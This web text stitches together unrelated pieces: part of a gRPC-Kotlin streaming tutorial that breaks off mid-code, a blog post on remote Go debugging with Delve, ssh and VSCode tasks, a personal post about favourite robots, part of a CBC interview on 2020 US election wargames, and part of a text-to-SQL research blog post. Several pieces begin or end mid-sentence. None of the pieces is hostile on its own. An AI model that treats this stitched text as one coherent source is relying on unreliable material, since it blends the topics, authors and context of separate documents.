<p>The example above defines a <code>RecordTrip</code> rpc call that conforms to our use case. The <code>stream</code> keyword is used inside the parentheses to define the client side streaming RPC call.</p>

<h4 id="bidirectional-streaming">Bidirectional Streaming</h4>

<p>Both the client and server can be streaming messages. This use case is good for implementing a chat room. A client could stream messages sent by a user. The server could return replies from other users.</p>

<p><img src="https://codingwithmohit.com/assets/images/grpc-kotlin-coroutines/grpc-kotlin-coroutines-5.png" alt="bidirectional-streaming"></p>

<div><div><pre><code><span>import</span> <span>"google/protobuf/timestamp.proto"</span><span>;</span>

<span>service</span> <span>VenueService</span> <span>{</span>

   <span>rpc</span> <span>chat</span><span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>returns</span> <span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>{}</span>

<span>}</span>

<span>message</span> <span>Comment</span> <span>{</span>
   <span>string</span> <span>text</span> <span>=</span> <span>1</span><span>;</span>
   <span>google.protobuf.Timestamp</span> <span>sentTime</span> <span>=</span> <span>3</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The rpc method <code>chat</code> takes a stream of comments and returns a replies. A comment is a message that has text and a timestamp for when it was sent. A <a href="https://developers.google.com/protocol-buffers/docs/reference/java/com/google/protobuf/Timestamp">Timestamp</a> is well known types in protocol buffers. In order to use it, you have to import the <a href="https://github.com/protocolbuffers/protobuf/blob/master/src/google/protobuf/timestamp.proto"><code>timestamp.proto</code></a> file.</p>

<div><div><pre><code><span>import</span> <span>"google/protobuf/timestamp.proto"</span><span>;</span>
</code></pre></div></div>

<p>In the rpc method, both request and response comments are marked with the <code>stream</code> keyword. The server could wait until comments are received in order to send all the replies. Or, the server could send a reply as it receives a comment. Its up to you how you want to implement the streaming logic.</p>

<div><div><pre><code><span>rpc</span> <span>chat</span><span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>returns</span> <span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>{}</span>
</code></pre></div></div>

<p>We’ve defined all the different types of RPC calls for our use case. How do we implement our logic to execute for the RPC calls?</p>

<h3 id="implementing-rpc-calls">Implementing RPC Calls</h3>

<p>When we run our build, the protocol buffer compiler will run. It will generates base implementation class for us from service.</p>

<div><div><pre><code><span>abstract</span> <span>class</span> <span>VenueServiceCoroutineImplBase</span><span>(</span><span>coroutineContext</span><span>)</span> <span>{</span>

  <span>open</span> <span>suspend</span> <span>fun</span> <span>getVenue</span><span>(</span><span>request</span><span>:</span> <span>Location</span><span>):</span> <span>Venue</span>

  <span>open</span> <span>fun</span> <span>listVenues</span><span>(</span><span>request</span><span>:</span> <span>Location</span><span>):</span> <span>Flow</span><span>&lt;</span><span>Venue</span><span>&gt;</span>

  <span>open</span> <span>suspend</span> <span>fun</span> <span>recordTrip</span><span>(</span><span>requests</span><span>:</span> <span>Flow</span><span>&lt;</span><span>Location</span><span>&gt;):</span> <span>TripSummary</span>

  <span>open</span> <span>fun</span> <span>chat</span><span>(</span><span>requests</span><span>:</span> <span>Flow</span><span>&lt;</span><span>Comment</span><span>&gt;):</span> <span>Flow</span><span>&lt;</span><span>Comment</span><span>&gt;</span>

<span>}</span>
</code></pre></div></div>

<p>Each open method in the generated class above corresponds to an RPC call. In order to add our own logic when these methods are called, we will create a service that inherits this class.</p>

<div><div><pre><code><span>class</span> <span>VenueGrpcService</span><span>:</span> <span>VenueServiceGrpcKt</span><span>.</span><span>VenueServiceCoroutineImplBase</span><span>()</span> <span>{</span>


<span>}</span>
</code></pre></div></div>

<h4 id="unary-rpc-call-1">Unary RPC Call</h4>

<p>Our unary RPC call took a location and returned a venue.</p>

<div><div><pre><code><span>service</span> <span>VenueService</span> <span>{</span>

   <span>rpc</span> <span>GetVenue</span><span>(</span><span>Location</span><span>)</span> <span>return</span><span>s</span> <span>(</span><span>Venue</span><span>)</span> <span>{}</span>

<span>}</span>
</code></pre></div></div>

<p>This RPC call is implemented as a suspending method in our service.</p>

<div><div><pre><code><span>class</span> <span>VenueGrpcService</span><span>:</span> <span>VenueServiceGrpcKt</span><span>.</span><span>VenueServiceCoroutineImplBase</span><span>()</span> <span>{</span>

  <span>override</span> <span>suspend</span> <span>fun</span> <span>getVenue</span><span>(</span><span>request</span><span>:</span> <span>Location</span><span>):</span> <span>Venue</span> <span>{</span>
        <span>return</span> <span>db</span><span>.</span><span>getVenue</span><span>(</span><span>request</span><span>)</span>
    <span>}</span>

<span>}</span>
</code></pre></div></div>

<p>We could add logic to query a database to get a venue based on a location. The suspending method above returns a <code>Venue</code>. In our protocol buffer file, we had defined this as a message.</p>

<div><div><pre><code><span>message</span> <span>Venue</span> <span>{</span>
   <span>string</span> <span>name</span> <span>=</span> <span>1</span><span>;</span>
   <span>Location</span> <span>location</span> <span>=</span> <span>2</span><span>;</span>
   <span>VenueType</span> <span>venueType</span> <span>=</span> <span>3</span><span>;</span>

   <span>enum</span> <span>VenueType</span> <span>{</span>
     <span>Landmark</span> <span>=</span> <span>0</span><span>;</span>
     <span>Driving_Range</span> <span>=</span> <span>1</span><span>;</span>
     <span>Golf_Course</span> <span>=</span> <span>2</span><span>;</span>
     <span>Restaurant</span> <span>=</span> <span>3</span><span>;</span>
     <span>Retail</span> <span>=</span> <span>4</span><span>;</span>
   <span>}</span>

   <span>int64</span> <span>checkins</span> <span>=</span> <span>4</span><span>;</span>
   <span>int64</span> <span>reviews</span> <span>=</span> <span>5</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The protocol buffer compiler creates a builder for the <code>Venue</code> message. It has setters for each field defined above. We could map to this type using its builder.</p>

<div><div><pre><code><span>Venue</span><span>.</span><span>newBuilder</span><span>()</span>
  <span>.</span><span>setName</span><span>(</span><span>..</span><span>.)</span>
  <span>.</span><span>setLocation</span><span>(</span><span>..</span><span>.)</span>
  <span>.</span><span>setVenueType</span><span>(</span><span>..</span><span>.)</span>
  <span>.</span><span>setCheckins</span><span>(</span><span>..</span><span>.)</span>
  <span>.</span><span>setReviews</span><span>(</span><span>..</span><span>.)</span>
  <span>.</span><span>build</span><span>()</span>
</code></pre></div></div>

<h4 id="server-streaming-1">Server Streaming</h4>

<div><div><pre><code><span>rpc</span> <span>listVenues</span><span>(</span><span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>stream</span> <span>Venue</span><span>)</span> <span>{</span> <span>}</span>
</code></pre></div></div>

<p>A server streaming RPC call was defined using the <code>listVenues</code> method that returns a stream of venues. This translates into method that returns a <a href="https://kotlin.github.io/kotlinx.coroutines/kotlinx-coroutines-core/kotlinx.coroutines.flow/-flow/">Flow</a> of <code>Venue</code>.</p>

<div><div><pre><code><span>class</span> <span>VenueGrpcService</span><span>:</span> <span>VenueServiceGrpcKt</span><span>.</span><span>VenueServiceCoroutineImplBase</span><span>()</span> <span>{</span>

  <span>override</span> <span>fun</span> <span>listVenues</span><span>(</span><span>request</span><span>:</span> <span>Location</span><span>):</span> <span>Flow</span><span>&lt;</span><span>Venue</span><span>&gt;</span> <span>{</span>
      <span>return</span> <span>db</span><span>.</span><span>getVenues</span><span>(</span><span>request</span><span>).</span><span>asFlow</span><span>()</span>
  <span>}</span>

<span>}</span>
</code></pre></div></div>

<p>We might have logic to query our database to get a list of venues nearby. The list return could be transformed into a <code>Flow</code> using the <code>asFlow</code> extension.</p>

<h4 id="client-streaming-1">Client Streaming</h4>

<p>A client streaming RPC call is also mapped to a <code>Flow</code>. But, the parameter of the generated is a Flow of requests.</p>

<div><div><pre><code><span>rpc</span> <span>RecordTrip</span><span>(</span><span>stream</span> <span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>TripSummary</span><span>)</span> <span>{}</span>
</code></pre></div></div>

<p>This RPC method is translated as follows.</p>

<div><div><pre><code><span>class</span> <span>VenueGrpcService</span><span>:</span> <span>VenueServiceGrpcKt</span><span>.</span><span>VenueServiceCoroutineImplBase</span><span>()</span> <span>{</span>

   <span>override</span> <span>suspend</span> <span>fun</span> <span>recordTrip</span><span>(</span><span>requests</span><span>:</span> <span>Flow</span><span>&lt;</span><span>Location</span><span>&gt;):</span> <span>TripSummary</span> <span>{</span>
        <span>..</span><span>.</span>
    <span>}</span>

<span>}</span>
</code></pre></div></div>

<p>In this generated method, the return type is a single message <code>TripSummary</code>. The request is a flow of locations.</p>

<h4 id="bidirectional-streaming-1">Bidirectional Streaming</h4>

<p>As we saw earlier, a bidirectional streaming call is a streaming responses and requests.</p>

<div><div><pre><code><span>rpc</span> <span>chat</span><span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>returns</span> <span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>{}</span>
</code></pre></div></div>

<div><div><pre><code><span>class</span> <span>VenueGrpcService</span><span>:</span> <span>VenueServiceGrpcKt</span><span>.</span><span>VenueServiceCoroutineImplBase</span><span>()</span> <span>{</span>

   <span>override</span> <span>fun</span> <span>chat</span><span>(</span><span>requests</span><span>:</span> <span>Flow</span><span>&lt;</span><span>Comment</span><span>&gt;):</span> <span>Flow</span><span>&lt;</span><span>Comment</span><span>&gt;</span> <span>{</span>
        <span>..</span><span>.</span>
   <span>}</span>

<span>}</span>
</code></pre></div></div>

<p>The chat RPC call translates to a method that takes a Flow of comments and returns a Flow of comments.</p>

<h3 id="config--start-grpc-server">Config &amp; Start gRPC Server</h3>

<p>We have implemented each RPC call. How do we configure and start our gRPC server? The gRPC-Kotlin library is built on top of <a href="https://github.com/grpc/grpc-java">gRPC-Java</a>. It provides a <a href="https://github.com/grpc/grpc-java/blob/master/api/src/main/java/io/grpc/ServerBuilder.java">builder</a> to get configure and start a gRPC server.</p>

<div><div><pre><code><span>val</span> <span>server</span> <span>=</span> <span>ServerBuilder</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>There’s a certain point in life in which you realize you need to debug a
program that simply cannot be run on your working machine due to reasons. In
my case I have to debug a program that communicates with <a href="https://iwd.wiki.kernel.org/">iwd</a>, the
Intel wireless daemon for Linux. My workstation doesn’t have a Wi-Fi adapter,
so I needed some sort of a remote debugging hack.</p>
<p>VSCode has a Remote Development addon specifically addressing such cases.
However:</p>
<ul>
<li>Commit signing, if you have <code>GPG_TTY</code> and auto-signing enabled, doesn’t seem
to work, failing to sign commit data.</li>
<li>SSH agent, if not using agent forwarding, won’t allow you to add keys.</li>
<li>Opening local folders, even though RD can do it, just doesn’t work for me.</li>
</ul>
<p>I’m doing Go development, so the hack I am describing applies to Go when using
<a href="https://github.com/go-delve/delve">Delve</a> for debugging. Nonetheless, the approach doesn’t change much if
your programming language’s of choice VSCode addon supports attaching to a
remote debugger.</p>
<p>What we’re going to do basically sums up to this:</p>
<ol>
<li>Write a script that does the following:
<ul>
<li>builds the binary with debugging support</li>
<li>copies it to the target machine via SCP</li>
<li>starts Delve in headless mode</li>
</ul>
</li>
<li>Add a VSCode debug profile that would attach to the target machine.</li>
<li>Make VSCode autostart the script on starting a debugging session.</li>
</ol>
<h3 id="scripting-building-and-delve">Scripting building and Delve</h3>
<p>Delve, the Go debugger, supports running as a headless server for the clients
to attach to. We need to run a binary remotely.</p>
<p>This can technically be achieved with a simple shell script, but I find using
<a href="https://taskfile.dev/" title="A convenient replacement for make">Task</a> a lot more convenient than writing a script or a Makefile.
Here’s what I came up with:</p>
<div><pre><code data-lang="yml"><span>version</span>: <span>'2'</span>

<span>tasks</span>:
  <span>killall</span>:
    <span>cmds</span>:
      <span># kills delve on a target machine, still succeeds if dlv's not running</span>
      - ssh target_machine killall dlv || <span>true</span>
  <span>push</span>:
    <span>deps</span>:
      - killall
    <span>cmds</span>:
      <span># builds the program with optimizations disabled</span>
      - go build -gcflags=<span>"all=-N -l"</span> -o ./build/debug_binary ./cmd/program
      <span># copies the binary to the target machine</span>
      - scp ./build/debug_binary target_machine:/home/tdemin/Desktop/debug_binary
  <span>delve</span>:
    <span>deps</span>:
      - push
    <span>cmds</span>:
      <span># starts dlv in headless mode listening on port 64001</span>
      <span># the tmux hack is here, as dlv doesn't fork into background so ssh</span>
      <span># won't stop and the debugging session won't start; nohup won't work here,</span>
      <span># nor will the &amp; operator</span>
      <span># for this to work you'll ned tmux installed of course</span>
      - ssh target_machine <span>'(cd ~ &amp;&amp; chmod +x Desktop/debug_binary &amp;&amp; tmux new -d dlv --headless -l \[::\]:64001 exec ./Desktop/debug_binary)'</span>
</code></pre></div><p>The entire sequence can now be started with <code>task delve</code>. The dependencies
ensure Delve is killed beforehand (<code>scp</code> won’t work if the program is still
running), and the binary is built and pushed to the target machine.</p>
<h3 id="configuring-the-debugging-profile">Configuring the debugging profile</h3>
<p>Long story short, here’s how you configure <code>.vscode/launch.json</code> (assuming
the <a href="https://marketplace.visualstudio.com/items?itemName=golang.Go">Go addon</a> is installed):</p>
<pre><code data-lang="jsonc">{
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Attach to target",
            // dlv uses API v1 by default, this is switchable with command line
            // flags at dlv startup
            "apiVersion": 1,
            "type": "go",
            "request": "attach",
            "mode": "remote",
            // appears to be mainly meaningless, dlv works just fine even if the
            // target doesn't have the source code for the program being
            // debugged
            "remotePath": "${workspaceFolder}",
            // dependency on our build task, the task will be described below
            "preLaunchTask": "Run Delve on target",
            "port": 64001,
            "host": "target_machine"
        }
    ]
}
</code></pre><h3 id="adding-the-pre-debug-task">Adding the pre-debug task</h3>
<p>This is a matter of a single file as well, the <code>.vscode/tasks.json</code>:</p>
<pre><code data-lang="jsonc">{
    "version": "2.0.0",
    "tasks": [
        {
            // has to match with the contents of preLaunchTask in launch.json
            "label": "Run Delve on target",
            "type": "shell",
            // runs Taskfile with our script
            "command": "task delve",
            "group": {
                "kind": "test",
                "isDefault": true
            },
            "presentation": {
                // hides the terminal with repetitive build output
                "reveal": "silent"
            }
        }
    ]
}
</code></pre><h3 id="debugging">Debugging</h3>
<p>When done, you can now hit F5 and enter debug session.</p>
<p>
    <a href="https://tdem.in/img/vscode-remote-debug-delve.png" target="_blank">
        <img src="https://tdem.in/img/vscode-remote-debug-delve.png" alt="VSCode remote debug session">
    </a>
    <span>VSCode remote debug session</span>
</p>

<p>This works, but has a limitation: the debug console/internal terminal aren’t
attached to program’s output. You can theoretically attach to the remote tmux
session to see the program’s stdout, but it’s rather bothersome to do that
every time.</p>
<p>Well, this works, so I hope this saves you time if VSCode’s Remote Development
just doesn’t work for you.</p>

<p>The other day I lopped off a sizeable chunk of my thumbprint while making a robot. The cut? It was one of those bright-red, swiftly-flowing ones, where you're pretty sure you're seeing bone or muscle or some other gross-thing-that-should-probably-stay-inside-your-body. The robot? It was made of cardboard and beer cans:</p>

<p>This little guy is one of many cardboard robots that I've made over the years. During summers, my sister and I would go to Vineland, New Jersey to stay with my aunt and cousins for a glorious week of catching frogs, playing Sega Genesis, eating spoonfuls of iced tea mix, and arts 'n' crafts.</p>
<p>For some reason, we'd always center on a unique theme each year for our arts 'n' crafts. One summer, it was <a href="https://www.charlieharrington.com/create-wonderful-things-be-good-have-fun">Klutz Press friendship bracelets</a>. Another was god's eyes - we made hundreds. Our proudest summer craft of them all? A "working" cardboard R2-D2. If not for a late '90s winter basement flood, Cardboard Artoo would still be with us today.</p>
<p>I decided to try my hand at making another cardboard robot because I've been thinking a lot about them. Mostly because I'm writing a children's novel about robots, but also cause it's summer and that's the sort of thing you do during summer.</p>
<p>There are all kinds of robots, cardboard and not. But there's a certain sort of robot that makes my gears turn. The rest of this post will review my favorite robots (and the kid who loves them).</p>
<h2>Robots I Love</h2>
<h3>R.O.B. (Robotic Operating Buddy)</h3>
<p>It's a robot... for your original Nintendo. I'm embarassed to admit it, but I've never seen a R.O.B. in real-life, despite scouring every local garage sale in New Jersey for years.</p>

<p>These Nintendo ads are just perfection. I'm still more excited for the promise of this system than any game console out today.</p>

<p>R.O.B. only ever worked with two Nintendo games. From what I've read, neither is very fun. But I'm sure there are some great ROM-hacks out there with more robotic operating buddy interactions.</p>
<h3>Johnny 5</h3>
<p>Duh.</p>
<p>Johnny 5 looks a lot like R.O.B., except with more nuclear-weapons. He loves reading, loves input, loves New York City. A loyal friend, and perhaps a bit too gullible for his own good.</p>

<p>It's probably becoming quite clear that I'm drawn to a rectangular face on a telescopic neck with tread-like wheels. That's just my type.</p>
<p>I also just discovered this video of someone's real-life Wall-E, and it's frightenly real-looking. Maybe this means I'll get to meet a Wall-E one day, hopefully not on a post-apocalyptic wasteland Earth.</p>

<h3>The flying robots from *Batteries Not Included</h3>
<p>I don't remember much about this movie, other than that my sister and I watched the recorded-from-TV VHS tape all the time, and there were these super cute baby flying robots who lived with a bunch of old people in an apartment building in New York City.</p>

<p>We got our 2-XL at a garage sale (garage sales were things of wonder to me as a child). Yes, we had the original 2-XL, the eight-track one. In fact, 2-XL was my first and only interaction with an eight-track system. In the early `90s, Tiger Electronics must have bought 2-XL, and they came out with a cassette-version. </p>

<p>Cozmo's fatal flaw is how nearly impossible it is to connect your phone to the robot's local wifi service, which is how you are forced to control and interact with Cozmo. The connection process is random, non-deterministic, and saps up most of the time you've allocated to play with Cozmo. Also, Cozmo's parent company recently went out of business, which is a huge bummer for the robot-toy industry.</p>
<p>That said, I've had a lot fun with Cozmo, including <a href="https://www.charlieharrington.com/teaching-my-robot-with-tensorflow">teaching him how to find my toothpaste with a TensorFlow computer vision model</a>.</p>

I could go through a whole list of them, cause I really do love them all (GNKs, Artoo, Threepio, IG-88, BB-8, those little mouse-like black boxes in the Death Star), but in a rare dose of restraint, here's my favorite Star Wars droid!</p>
<h4>WED-15-1016</h4>
<p>It's R.O.B. with a longer neck, a blue face, and way more creepy claw arms. You may remember this robot critter from its role in repairing the Millenium Falcon at Hoth Base in Empire Strikes Back. Or at least attempting to repair.</p>

<h2>More robots</h2>
<p>So, who did I miss in my list? Data? He's an android, so not exactly a robot. But possibly Mega Man X is an android, so maybe I'm already mixing things up.</p>
<p>Speaking of lists, I also found this gigantic <a href="https://en.wikipedia.org/wiki/List_of_fictional_robots_and_androids">list of fictional robots and androids</a> on Wikipedia.</p>
<p>I'm not-so-secretly hoping that, one day, the robots in my book will be added to this Wikipedia list. Yes, I could edit the Wikipedia page myself, but c'mon, that's not the goal here.</p>
<h2>From cardboard to ciruit boards</h2>
<p>Also, it's high time to upgrade my hobby. I've begun looking into basic robotics kits, and I'll hopefully be constructing some new robotic best friends very soon. Maybe not Maker-Faire worthy, but ya gotta start somewhere.</p></div></div>]]>

How many of them ended with a smooth transition of power?</strong></p>  <p>Well, none of them really ended up with what we would traditionally call a smooth transition of power. There were ways in which every one of the scenarios ended up being contested, but three of them ended pretty catastrophically, in the sense&nbsp;that the actual results of the election were contested right down to Inauguration Day, and protests and counter protests in the streets escalated to violence. So it was a pretty grim outcome.</p>  <p><strong>To develop these scenarios, you did wargaming? What is that?</strong></p>  <p>Well, wargaming is a methodology that's been used, as you can tell from the name, primarily by the military, but increasingly also in business contexts, and also by non-profits, as in this case, to explore — effectively the possibility space that you can get into when you're dealing with complex numbers of actors who are behaving in adversarial ways toward one another.</p>  <p>So it's a way of anticipating the dynamic interaction effects that can emerge when you have multiple sets of players, each competing for a prize of some sort.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/portland-protests.jpg 300w,https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/portland-protests.jpg 460w,https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/portland-protests.jpg 620w,https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/portland-protests.jpg 780w,https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/portland-protests.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/portland-protests.jpg"></p></div><figcaption>Police declared a riot around midnight Aug. 15, as Portland protests continued for the 80th consecutive night. One of the scenarios that played out in the wargames, held in June, was the deployment of National Guard to quell left-wing protests, a situation that has since come to pass.  <!-- --> <!-- -->(Dave Killen/The Oregonian via AP)</figcaption></figure></span></p>  <p><strong>How does it work? Do you say, "Well, what if this happens, what if that happens?"&nbsp;and each party has their own interests?</strong></p>  <p>What we did was we posed four different scenarios. We ran the war games four times [with] four different scenarios for the actual electoral outcome,&nbsp;and then in each case, we played out with teams that represented the Trump campaign, that represented the Biden campaign, that represented Democratic elected officials across the country, Republican elected officials across the country, the courts and the media.</p>  <p>So these were all played by teams of people who would simulate what they think those actors would do in a contested election scenario. It's meant to basically allow you to explore and understand what could happen, not what will happen. It's not a prediction. It's more an exploration of the possibilities of things that could take place.</p>  <p><strong>Why did you pick this tool to look at the possible outcomes of the 2020 U.S. elections? You could have brought everyone together just for a conversation.</strong></p>  <p>Originally, we were planning on doing that. And of course, COVID kind of interrupted our planning for this. And the funny thing is the reason why we use this particular methodology — we chose it back this methodology back in February — was partly because we were feeling as if people were complacent about the kinds of disruption risks that exist in the American political system.</p>  <p>And what's happened, of course, in the seven months since then, is we've had this giant pandemic. And I think that's woken people up to the fact that they need to take seriously [possible] long-tail, low-probability, high-impact events.&nbsp;</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/election-2020-postal-service.jpg 300w,https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/election-2020-postal-service.jpg 460w,https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/election-2020-postal-service.jpg 620w,https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/election-2020-postal-service.jpg 780w,https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/election-2020-postal-service.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/election-2020-postal-service.jpg"></p></div><figcaption>In this image from video, U.S. Postmaster General Louis DeJoy testifies during the Senate committee hearing on Friday.

So November 4 to January 20, that 10-and-a-half week period.&nbsp;But the thing I worry about most with respect to the way the president is currently discussing [and] tweeting about voting by mail, is he's in a sense pre-discrediting the vote and he's trying to sow a narrative with his fans that the only way he can lose is if there's a fraud of some sort. And that therefore that would suggest that they should, at minimum, not respect the next president, not respect a President Biden, not consider him to be a legitimate president and, more extremely, perhaps actually physically resist allowing him to take office should he win.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_300/usa-election-convention.JPG 300w,https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_460/usa-election-convention.JPG 460w,https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_620/usa-election-convention.JPG 620w,https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/usa-election-convention.JPG 780w,https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_1180/usa-election-convention.JPG 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/usa-election-convention.JPG"></p></div><figcaption>This week, Joe Biden was officially named the Democratic Presidential nominee. <!-- --> <!-- -->(Kevin Lamarque/Reuters)</figcaption></figure></span></p>  <p>We don't know who's going to win, of course. We ran scenarios that explore the entire possibility space&nbsp;ranging from Donald Trump winning the electoral college clearly to a Biden&nbsp;landslide on the other hand, and looked at all sorts of different kinds of scenarios in between, and he's trying to pre-discredit the vote, so that when he loses — if he loses, he can claim he was either robbed of his rightful re-election and then possibly use that as an excuse to set up actually trying to prevent him from being forced from giving up the office.</p>  <p><strong>Nils, I have to say you sound deeply concerned. What do these outcomes tell you about the health of democracy in the United States right now?</strong></p>  <p>Well, obviously, it doesn't say anything very good about the health of the democracy. What I would say is this:&nbsp;when Donald Trump was elected in 2016, what I told everybody is&nbsp;it would be a test of the stability and quality of America's political institutions. And that was, I think, true. What I learned from these war-game processes is just how much of the institutional infrastructure of our democracy relies primarily on norms, rather than de facto or de jure rules.&nbsp;</p>  <p>The number of moves that an incumbent president who is uninhibited by norms and unrestrained by his own party can do, completely legally, is really quite disturbing.&nbsp;So, there can be things like invoking the insurrection act to bring out troops into the streets, calling for emergency powers that can invoke all sorts of things. These are powers that have existed legally within the constitutional order for a long time, and the only reason they haven't been used to disrupt elections in the past is because there were norms inhibiting incumbents from behaving that way. And those norms were enforced partly by their own party.</p>  <p>And so I think the question you have to ask is, when you look at this particular president, does he respect norms? And when you look at this particular political party that he leads, do we think that if he does choose to disrespect the norms, they will restrain him? I'll leave it to your listeners to decide what they think about that.</p>  <hr>  <p><em>Written and produced by Samraweet Yohannes. </em><em>Q&amp;A edited for length and clarity.</em></p></span></p></div></div>]]>

It organizes data using inter-linked tables consisting of columns (also called "fields" or "attributes") and rows (also called "records" or "tuples") (Figure 2). Generally, each table represents an entity type (e.g. <em>user</em> and <em>contact)</em>; each column represents an attribute of the entity type (<em>name</em> and <em>address</em>) and each row represents an instance. Some columns are <a href="https://en.wikipedia.org/wiki/Primary_key">primary keys</a>, used for uniquely identifying a row (e.g. <em>contact.account_name</em>), and some are <a href="https://en.wikipedia.org/wiki/Foreign_key">foreign keys</a>, used to reference a primary key in a different table (e.g. <em>boat.contact</em>). </p><figure><img src="https://blog.einstein.ai/content/images/2020/08/prework_entity_diagram.jpg" alt="" srcset="https://blog.einstein.ai/content/images/size/w600/2020/08/prework_entity_diagram.jpg 600w, https://blog.einstein.ai/content/images/size/w1000/2020/08/prework_entity_diagram.jpg 1000w, https://blog.einstein.ai/content/images/2020/08/prework_entity_diagram.jpg 1004w" sizes="(min-width: 720px) 720px"><figcaption>Figure 2.

Industrial database management systems (DBMSs) often implement their own <a href="https://learnsql.com/blog/what-sql-dialect-to-learn/#:~:text=SQL%20Is%20the%20Language%20for%20Talking%20to%20Databases&amp;text=PostgreSQL%2C%20MySQL%2C%20Oracle%2C%20and,call%20these%20variants%20SQL%20dialects.">SQL dialects</a> (<a href="https://en.wikipedia.org/wiki/PostgreSQL">PostgreSQL</a>, <a href="https://en.wikipedia.org/wiki/SQLite">SQLite</a>, <a href="https://en.wikipedia.org/wiki/Oracle_Database">Oracle</a>, <a href="https://en.wikipedia.org/wiki/MySQL">MySQL</a> etc.) and extensions.

As of today, it is common for SQL queries to be embedded into software to provide a more accessible user interface (e.g. <a href="https://www.klipfolio.com/blog/create-sql-dashboard#:~:text=A%20SQL%20dashboard%20is%20an,SQL%20(Structured%20Query%20Language).">dashboards</a>).

</table><!--kg-card-end: html--><p>Following previous work [2,4], we design an encoder-decoder model that takes a natural language question and the target DB schema as input and synthesizes a SQL query as output. We represent the input question and the DB schema jointly as a tagged sequence (Figure 4), which is first encoded with <a href="https://arxiv.org/abs/1810.04805">BERT</a> and then a <a href="https://en.wikipedia.org/wiki/Bidirectional_recurrent_neural_networks">bi-directional LSTM</a>. We use the hidden representations corresponding to special tokens <code>[T]</code> and <code>[C]</code> in this encoding as the table and column representations, and infuse them with DB metadata features. The question portion of the encoding is further encoded with another Bi-LSTM, and we use its output as the start state of the decoder.</p><figure><img src="https://blog.einstein.ai/content/images/2020/08/Screen-Shot-2020-08-20-at-11.38.02-PM.png" alt="" srcset="https://blog.einstein.ai/content/images/size/w600/2020/08/Screen-Shot-2020-08-20-at-11.38.02-PM.png 600w, https://blog.einstein.ai/content/images/size/w1000/2020/08/Screen-Shot-2020-08-20-at-11.38.02-PM.png 1000w, https://blog.einstein.ai/content/images/size/w1600/2020/08/Screen-Shot-2020-08-20-at-11.38.02-PM.png 1600w, https://blog.einstein.ai/content/images/2020/08/Screen-Shot-2020-08-20-at-11.38.02-PM.png 1733w" sizes="(min-width: 720px) 720px"><figcaption>Figure 4. Our joint question-schema encoder for cross-database semantic parsing.

At each decoding step, the decoder performs one of the three actions: generating a SQL keyword, copying a table/column, or copying a token from the input utterance, determined by a learned gating function.</p><p>We train the model on a popular cross-DB text-to-SQL dataset, <a href="https://yale-lily.github.io/spider">Spider</a> [4]. Combined with table value augmentation and static SQL correctness checking, our model achieves state-of-the-art structure matching accuracy on the Spider dev set. More details can be found in our <a href="https://arxiv.org/abs/2007.15280">research paper</a>. (We are continuously improving the semantic parser and updating the Photon backend.)</p><p><strong>Handling Untranslatable Utterances.</strong> While state-of-the-art cross-DB semantic parsers are able to handle a large set of common user requests, there is still ample space for improvement. Besides reducing errors made on questions that have a SQL translation, we also need to properly handle input utterances that cannot be mapped to a SQL statement, even by humans. </p><p>Practical NLIDBs are exposed to a wide range of noisy user input. Users tend to employ underspecified and incomplete NL expressions when interacting with such interfaces [6,8], and may ask for information that is not provided by the DB. For such input, learning-based semantic parsers can make unreliable guesses that may appear correct on the surface. This issue is especially severe for end-to-end neural semantic parsers when the noisy input appears similar to a valid input in the embedding space. </p><figure><img src="https://blog.einstein.ai/content/images/2020/08/Screen-Shot-2020-08-24-at-6.39.42-PM-1.png" alt="" srcset="https://blog.einstein.ai/content/images/size/w600/2020/08/Screen-Shot-2020-08-24-at-6.39.42-PM-1.png 600w, 